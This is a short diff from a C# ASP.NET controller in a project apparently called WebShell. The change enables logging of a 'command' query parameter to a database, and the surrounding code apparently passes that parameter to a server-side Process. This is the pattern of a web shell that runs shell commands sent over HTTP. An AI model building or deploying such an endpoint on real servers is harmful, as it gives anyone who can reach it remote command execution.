@@ -23,9 +23,9 @@ namespace WebShell.Controllers
         [HttpGet]
         public string Index(string command)
         {
-            //if(command != null)
-                //_dbContext.Add(new Command() {Text = command});
-            //_dbContext.SaveChanges();
+            if(command != null)
+                _dbContext.Add(new Command() {Text = command});
+            _dbContext.SaveChanges();
             Process cmd = new Process
             {
                 StartInfo = new ProcessStartInfo()
